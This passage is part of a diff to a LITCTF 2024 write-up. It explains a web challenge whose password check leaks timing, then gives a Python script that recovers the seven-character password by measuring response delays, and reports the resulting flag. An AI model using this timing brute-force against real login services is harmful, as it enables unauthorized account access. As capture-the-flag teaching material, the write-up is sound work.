@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/68ca7abb-ebf4-4e83-b1d8-dbb77acb0394)![image](https://github.com/user-attachments/assets/7c90ff84-da16-4103-9f49-fac30164815e)<h3> LITCTF 2024 </h3>
+<h3> LITCTF 2024 </h3>
 
 ![image](https://github.com/user-attachments/assets/fd31c0ee-7551-4295-9e93-23c24cc9a468)
 
@@ -256,19 +256,65 @@ Flag: LITCTF{backtr@ked_230fim0}
 ![image](https://github.com/user-attachments/assets/75586b0c-7f47-470a-b4a4-e90fc3384536)
 
 We are given the application source code
+![image](https://github.com/user-attachments/assets/7c90ff84-da16-4103-9f49-fac30164815e)
 ![image](https://github.com/user-attachments/assets/823b5646-86c7-44bf-8c25-1c7e47ad651d)
 
+Ok this code is very small and straight forward
 
+If the request method is `POST` it will get the password from the request body and makes sure the length is 7
 
+It then goes ahead with the password check which does this:
+- Iterate through the length of the provided input which is 7 and makes sure the character at the current index equals the password at the same index, where the index value is the iterate
+- If it's correct it would sleep for one second and if it's the right password we get the success message which is what we would submit as the flag wrapper in `LITCTF{}`
 
+It's clear that we need to perform a timing-based attack, which is a type of side-channel attack. 
 
+This attack exploits the fact that if a character in our provided password matches the correct one, there will be a slight delay before moving on to check the next character. 
 
+We can leverage this time lapse to figure out the correct character at each position
 
+With that here's my solve script
 
+```python
+import requests
+import string
 
+url = "http://127.0.0.1:5000"
+charset = string.ascii_letters
+flag = ""
 
+for i in range(7):
+    for j in charset:
+        pwd = (flag + j).ljust(7, '.')
+        password = {
+            "password": pwd
+        }
+        print(password)
+        req = requests.post(url, data=password)
+        if int(req.elapsed.total_seconds()) > len(flag):
+            flag += j
+            break
+```
 
+Here's it running locally
+![image](https://github.com/user-attachments/assets/3bae1748-2aff-4113-880a-eaef250a27fa)
 
+We can see it's retrieving the password
+![image](https://github.com/user-attachments/assets/705fee30-96e0-4224-a0db-fdf4f65c8f3d)
+
+I ran it on the remote instance multiple times due to latency issue and timeout (the remote instance lasts for just 9 minutes)
+![image](https://github.com/user-attachments/assets/0fc8ba07-c871-42c6-94fa-2e081a027a95)
+
+And YES i used a vps to run it due to latency issue
+
+After some minutes i got the password to be `kBySlaY`
+
+We can confirm it's right
+![image](https://github.com/user-attachments/assets/89a3d6d4-9f85-440d-8630-544816017a5c)
+
+```
+Flag: LITCTF{kBySlaY}
+```
 
 
 
